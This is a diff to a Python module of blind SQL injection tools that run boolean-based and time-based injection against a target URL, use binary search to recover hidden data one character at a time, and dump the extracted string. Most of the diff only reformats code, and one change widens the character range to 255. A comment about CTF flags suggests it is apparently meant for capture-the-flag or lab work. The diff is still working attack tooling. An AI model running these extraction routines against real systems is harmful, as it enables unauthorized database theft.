@@ -95,7 +95,9 @@ class BlindSqliBooleanTool:
         test_data = {**form_data, param: payload}
         try:
             if method == "GET":
-                resp = self.session.get(url, params=test_data, headers=headers, timeout=timeout)
+                resp = self.session.get(
+                    url, params=test_data, headers=headers, timeout=timeout
+                )
             else:
                 # Detect JSON content type
                 content_type = ""
@@ -104,9 +106,13 @@ class BlindSqliBooleanTool:
                         content_type = v.lower()
                         break
                 if "application/json" in content_type:
-                    resp = self.session.post(url, json=test_data, headers=headers, timeout=timeout)
+                    resp = self.session.post(
+                        url, json=test_data, headers=headers, timeout=timeout
+                    )
                 else:
-                    resp = self.session.post(url, data=test_data, headers=headers, timeout=timeout)
+                    resp = self.session.post(
+                        url, data=test_data, headers=headers, timeout=timeout
+                    )
             return resp, None
         except Exception as exc:
             return None, str(exc)
@@ -150,33 +156,38 @@ class BlindSqliBooleanTool:
     ) -> Tuple[Optional[str], List[str]]:
         """Use binary search to find ASCII value of character at position."""
         logs = []
-        low, high = 32, 126  # Printable ASCII range
+        low, high = 32, 255  # Full extended ASCII range
 
         while low <= high:
             mid = (low + high) // 2
             payload = payload_template.format(query=query, position=position, value=mid)
 
-            resp, error = self._make_request(url, method, param, payload, form_data, headers, timeout)
+            resp, error = self._make_request(
+                url, method, param, payload, form_data, headers, timeout
+            )
             if error:
                 logs.append(f"  Error at mid={mid}: {error}")
                 return None, logs
 
             # If response matches true_response, condition is TRUE (char > mid)
+            mid_display = chr(mid) if 32 <= mid <= 126 else f"0x{mid:02x}"
             if self._responses_match(resp, true_response):
-                logs.append(f"  ASCII>{mid}: TRUE -> char > {mid} ({chr(mid) if 32 <= mid <= 126 else '?'})")
+                logs.append(f"  ASCII>{mid}: TRUE -> char > {mid} ({mid_display})")
                 low = mid + 1
             else:
-                logs.append(f"  ASCII>{mid}: FALSE -> char <= {mid} ({chr(mid) if 32 <= mid <= 126 else '?'})")
+                logs.append(f"  ASCII>{mid}: FALSE -> char <= {mid} ({mid_display})")
                 high = mid - 1
 
         # The character is at 'low' (or low-1 if we overshot)
-        if 32 <= low <= 127:
+        if 32 <= low <= 255:
             char = chr(low)
-            logs.append(f"  Found: ASCII {low} = '{char}'")
+            low_display = char if 32 <= low <= 126 else f"0x{low:02x}"
+            logs.append(f"  Found: ASCII {low} = '{low_display}'")
             return char, logs
-        elif 32 <= high <= 126:
+        elif 32 <= high <= 255:
             char = chr(high)
-            logs.append(f"  Found: ASCII {high} = '{char}'")
+            high_display = char if 32 <= high <= 126 else f"0x{high:02x}"
+            logs.append(f"  Found: ASCII {high} = '{high_display}'")
             return char, logs
         else:
             logs.append(f"  Could not determine character (low={low}, high={high})")
@@ -203,7 +214,9 @@ class BlindSqliBooleanTool:
             mid = (low + high) // 2
             payload = payload_template.format(query=query, value=mid)
 
-            resp, error = self._make_request(url, method, param, payload, form_data, headers, timeout)
+            resp, error = self._make_request(
+                url, method, param, payload, form_data, headers, timeout
+            )
             if error:
                 logs.append(f"  Error at mid={mid}: {error}")
                 return None, logs
@@ -252,7 +265,7 @@ class BlindSqliBooleanTool:
         timeout = data.get("timeout", 10)
 
         output_lines = [
-            f"[BlindSqliBooleanTool] Boolean-Based Blind SQLi",
+            "[BlindSqliBooleanTool] Boolean-Based Blind SQLi",
             "=" * 50,
             f"Target: {url}",
             f"Method: {method}",
@@ -277,14 +290,22 @@ class BlindSqliBooleanTool:
         if error:
             return f"[BlindSqliBooleanTool] Error getting false baseline: {error}"
 
-        output_lines.append(f"True condition response: Status={true_resp.status_code}, Length={len(true_resp.text)}")
-        output_lines.append(f"False condition response: Status={false_resp.status_code}, Length={len(false_resp.text)}")
+        output_lines.append(
+            f"True condition response: Status={true_resp.status_code}, Length={len(true_resp.text)}"
+        )
+        output_lines.append(
+            f"False condition response: Status={false_resp.status_code}, Length={len(false_resp.text)}"
+        )
 
         # Check if we can distinguish true from false
         if self._responses_match(true_resp, false_resp):
             output_lines.append("")
-            output_lines.append("WARNING: True and false responses are too similar to distinguish!")
-            output_lines.append("Try different conditions or use time-based blind SQLi instead.")
+            output_lines.append(
+                "WARNING: True and false responses are too similar to distinguish!"
+            )
+            output_lines.append(
+                "Try different conditions or use time-based blind SQLi instead."
+            )
             return "\n".join(output_lines)
 
         output_lines.append("Baseline established - responses are distinguishable.")
@@ -316,14 +337,20 @@ class BlindSqliBooleanTool:
                 kt_matches_true = self._responses_match(kt_resp, true_resp)
                 kt_matches_false = self._responses_match(kt_resp, false_resp)
 
-                output_lines.append(f"  Known-true (1=1) matches true baseline: {kt_matches_true}")
-                output_lines.append(f"  Known-true (1=1) matches false baseline: {kt_matches_false}")
+                output_lines.append(
+                    f"  Known-true (1=1) matches true baseline: {kt_matches_true}"
+                )
+                output_lines.append(
+                    f"  Known-true (1=1) matches false baseline: {kt_matches_false}"
+                )
 
                 if kt_matches_false and not kt_matches_true:
                     oracle_inverted = True
                     # Swap baselines
                     true_resp, false_resp = false_resp, true_resp
-                    output_lines.append("  INVERTED ORACLE DETECTED! Swapping true/false baselines.")
+                    output_lines.append(
+                        "  INVERTED ORACLE DETECTED! Swapping true/false baselines."
+                    )
                 else:
                     output_lines.append("  Oracle is NORMAL (not inverted).")
 
@@ -334,8 +361,12 @@ class BlindSqliBooleanTool:
             output_lines.append("RESULT: Boolean injection conditions are working.")
             output_lines.append("")
             output_lines.append("NEXT STEPS:")
-            output_lines.append("  1. Use operation='extract_length' to find data length")
-            output_lines.append("  2. Use operation='extract_char' to extract characters")
+            output_lines.append(
+                "  1. Use operation='extract_length' to find data length"
+            )
+            output_lines.append(
+                "  2. Use operation='extract_char' to extract characters"
+            )
             output_lines.append("")
             output_lines.append("EXAMPLE PAYLOAD TEMPLATES (by database):")
             for db, templates in self.PAYLOAD_TEMPLATES.items():
@@ -360,8 +391,16 @@ class BlindSqliBooleanTool:
             output_lines.append("-" * 40)
 
             length, logs = self._binary_search_length(
-                url, method, param, payload_template, query,
-                true_resp, form_data, headers, timeout, max_length
+                url,
+                method,
+                param,
+                payload_template,
+                query,
+                true_resp,
+                form_data,
+                headers,
+                timeout,
+                max_length,
             )
 
             output_lines.extend(logs)
@@ -388,17 +427,29 @@ class BlindSqliBooleanTool:
             output_lines.append("-" * 40)
 
             char, logs = self._binary_search_char(
-                url, method, param, payload_template, query, position,
-                true_resp, form_data, headers, timeout
+                url,
+                method,
+                param,
+                payload_template,
+                query,
+                position,
+                true_resp,
+                form_data,
+                headers,
+                timeout,
             )
 
             output_lines.extend(logs)
             output_lines.append("")
 
             if char is not None:
-                output_lines.append(f"RESULT: Character at position {position} = '{char}' (ASCII {ord(char)})")
+                output_lines.append(
+                    f"RESULT: Character at position {position} = '{char}' (ASCII {ord(char)})"
+                )
             else:
-                output_lines.append(f"RESULT: Could not extract character at position {position}.")
+                output_lines.append(
+                    f"RESULT: Could not extract character at position {position}."
+                )
 
         return "\n".join(output_lines)
 
@@ -488,7 +539,9 @@ class BlindSqliTimeTool:
         start_time = time.time()
         try:
             if method == "GET":
-                resp = self.session.get(url, params=test_data, headers=headers, timeout=timeout)
+                resp = self.session.get(
+                    url, params=test_data, headers=headers, timeout=timeout
+                )
             else:
                 # Detect JSON content type
                 content_type = ""
@@ -497,9 +550,13 @@ class BlindSqliTimeTool:
                         content_type = v.lower()
                         break
                 if "application/json" in content_type:
-                    resp = self.session.post(url, json=test_data, headers=headers, timeout=timeout)
+                    resp = self.session.post(
+                        url, json=test_data, headers=headers, timeout=timeout
+                    )
                 else:
-                    resp = self.session.post(url, data=test_data, headers=headers, timeout=timeout)
+                    resp = self.session.post(
+                        url, data=test_data, headers=headers, timeout=timeout
+                    )
             elapsed = time.time() - start_time
             return elapsed, resp.status_code, None
         except requests.exceptions.Timeout:
@@ -551,7 +608,7 @@ class BlindSqliTimeTool:
         templates = self.TIME_TEMPLATES[db_type]
 
         output_lines = [
-            f"[BlindSqliTimeTool] Time-Based Blind SQLi",
+            "[BlindSqliTimeTool] Time-Based Blind SQLi",
             "=" * 50,
             f"Target: {url}",
             f"Method: {method}",
@@ -570,7 +627,9 @@ class BlindSqliTimeTool:
         if baseline_error:
             output_lines.append(f"Baseline error: {baseline_error}")
         else:
-            output_lines.append(f"Baseline: {baseline_elapsed:.2f}s (status: {baseline_status})")
+            output_lines.append(
+                f"Baseline: {baseline_elapsed:.2f}s (status: {baseline_status})"
+            )
         output_lines.append("")
 
         if operation == "detect":
@@ -591,7 +650,9 @@ class BlindSqliTimeTool:
                 output_lines.append(f"Response: TIMEOUT after {elapsed:.2f}s")
                 output_lines.append("")
                 output_lines.append("RESULT: Time-based injection DETECTED!")
-                output_lines.append(f"  Response took >{timeout}s indicating successful SLEEP")
+                output_lines.append(
+                    f"  Response took >{timeout}s indicating successful SLEEP"
+                )
             elif error:
                 output_lines.append(f"Response: Error - {error}")
                 output_lines.append("")
@@ -600,12 +661,16 @@ class BlindSqliTimeTool:
                 output_lines.append(f"Response: {elapsed:.2f}s (status: {status})")
                 output_lines.append("")
                 output_lines.append("RESULT: Time-based injection DETECTED!")
-                output_lines.append(f"  Response took {elapsed:.2f}s (expected ~{delay}s delay)")
+                output_lines.append(
+                    f"  Response took {elapsed:.2f}s (expected ~{delay}s delay)"
+                )
             else:
                 output_lines.append(f"Response: {elapsed:.2f}s (status: {status})")
                 output_lines.append("")
                 output_lines.append("RESULT: Time-based injection NOT detected")
-                output_lines.append(f"  Response was fast ({elapsed:.2f}s), no delay observed")
+                output_lines.append(
+                    f"  Response was fast ({elapsed:.2f}s), no delay observed"
+                )
                 output_lines.append("  Try different db_type or prefix/suffix")
 
         elif operation == "extract_length":
@@ -637,10 +702,14 @@ class BlindSqliTimeTool:
 
                 is_true = self._is_delayed(elapsed, delay) or error == "timeout"
                 if is_true:
-                    output_lines.append(f"  LENGTH>{mid}: TRUE ({elapsed:.2f}s) -> length > {mid}")
+                    output_lines.append(
+                        f"  LENGTH>{mid}: TRUE ({elapsed:.2f}s) -> length > {mid}"
+                    )
                     low = mid + 1
                 else:
-                    output_lines.append(f"  LENGTH>{mid}: FALSE ({elapsed:.2f}s) -> length <= {mid}")
+                    output_lines.append(
+                        f"  LENGTH>{mid}: FALSE ({elapsed:.2f}s) -> length <= {mid}"
+                    )
                     high = mid - 1
 
             output_lines.append("")
@@ -658,12 +727,16 @@ class BlindSqliTimeTool:
             output_lines.append("-" * 40)
 
             # Binary search for ASCII value
-            low, high = 32, 126
+            low, high = 32, 255
             while low <= high:
                 mid = (low + high) // 2
                 payload = templates["char"].format(
-                    prefix=prefix, suffix=suffix, delay=delay, query=query,
-                    position=position, value=mid
+                    prefix=prefix,
+                    suffix=suffix,
+                    delay=delay,
+                    query=query,
+                    position=position,
+                    value=mid,
                 )
 
                 elapsed, status, error = self._timed_request(
@@ -674,21 +747,30 @@ class BlindSqliTimeTool:
                     output_lines.append(f"  ASCII>{mid}: Error - {error}")
                     break
 
+                mid_display = chr(mid) if 32 <= mid <= 126 else f"0x{mid:02x}"
                 is_true = self._is_delayed(elapsed, delay) or error == "timeout"
                 if is_true:
-                    output_lines.append(f"  ASCII>{mid}: TRUE ({elapsed:.2f}s) -> char > '{chr(mid)}'")
+                    output_lines.append(
+                        f"  ASCII>{mid}: TRUE ({elapsed:.2f}s) -> char > '{mid_display}'"
+                    )
                     low = mid + 1
                 else:
-                    output_lines.append(f"  ASCII>{mid}: FALSE ({elapsed:.2f}s) -> char <= '{chr(mid)}'")
+                    output_lines.append(
+                        f"  ASCII>{mid}: FALSE ({elapsed:.2f}s) -> char <= '{mid_display}'"
+                    )
                     high = mid - 1
 
-            if 32 <= low <= 127:
+            if 32 <= low <= 255:
                 char = chr(low)
                 output_lines.append("")
-                output_lines.append(f"RESULT: Character at position {position} = '{char}' (ASCII {low})")
+                output_lines.append(
+                    f"RESULT: Character at position {position} = '{char}' (ASCII {low})"
+                )
             else:
                 output_lines.append("")
-                output_lines.append(f"RESULT: Could not determine character (bounds: {low}-{high})")
+                output_lines.append(
+                    f"RESULT: Could not determine character (bounds: {low}-{high})"
+                )
 
         return "\n".join(output_lines)
 
@@ -772,7 +854,7 @@ class SqliDataDumper:
         timeout = data.get("timeout", 15)
 
         output_lines = [
-            f"[SqliDataDumper] Full Data Extraction",
+            "[SqliDataDumper] Full Data Extraction",
             "=" * 50,
             f"Target: {url}",
             f"Parameter: {param}",
@@ -797,7 +879,9 @@ class SqliDataDumper:
             payload_template = data.get("payload_template")
             if not payload_template:
                 templates = BlindSqliBooleanTool.PAYLOAD_TEMPLATES.get(db_type, {})
-                payload_template = templates.get("char", BlindSqliBooleanTool.PAYLOAD_TEMPLATES["mysql"]["char"])
+                payload_template = templates.get(
+                    "char", BlindSqliBooleanTool.PAYLOAD_TEMPLATES["mysql"]["char"]
+                )
 
             output_lines.append("Extracting using boolean technique...")
             output_lines.append("-" * 40)
@@ -827,12 +911,16 @@ class SqliDataDumper:
                     char = char_match.group(1)
                     extracted += char
                     consecutive_nulls = 0
-                    output_lines.append(f"  Position {position}: '{char}' -> \"{extracted}\"")
+                    output_lines.append(
+                        f"  Position {position}: '{char}' -> \"{extracted}\""
+                    )
                 else:
                     consecutive_nulls += 1
                     output_lines.append(f"  Position {position}: [failed to extract]")
                     if consecutive_nulls >= max_consecutive_nulls:
-                        output_lines.append(f"  Stopping after {max_consecutive_nulls} consecutive failures")
+                        output_lines.append(
+                            f"  Stopping after {max_consecutive_nulls} consecutive failures"
+                        )
                         break
 
         else:  # time-based
@@ -869,17 +957,21 @@ class SqliDataDumper:
                     char = char_match.group(1)
                     extracted += char
                     consecutive_nulls = 0
-                    output_lines.append(f"  Position {position}: '{char}' -> \"{extracted}\"")
+                    output_lines.append(
+                        f"  Position {position}: '{char}' -> \"{extracted}\""
+                    )
                 else:
                     consecutive_nulls += 1
                     output_lines.append(f"  Position {position}: [failed to extract]")
                     if consecutive_nulls >= max_consecutive_nulls:
-                        output_lines.append(f"  Stopping after {max_consecutive_nulls} consecutive failures")
+                        output_lines.append(
+                            f"  Stopping after {max_consecutive_nulls} consecutive failures"
+                        )
                         break
 
         output_lines.append("")
         output_lines.append("=" * 50)
-        output_lines.append(f"EXTRACTED DATA: \"{extracted}\"")
+        output_lines.append(f'EXTRACTED DATA: "{extracted}"')
         output_lines.append(f"Length: {len(extracted)} characters")
 
         # Check for CTF flags
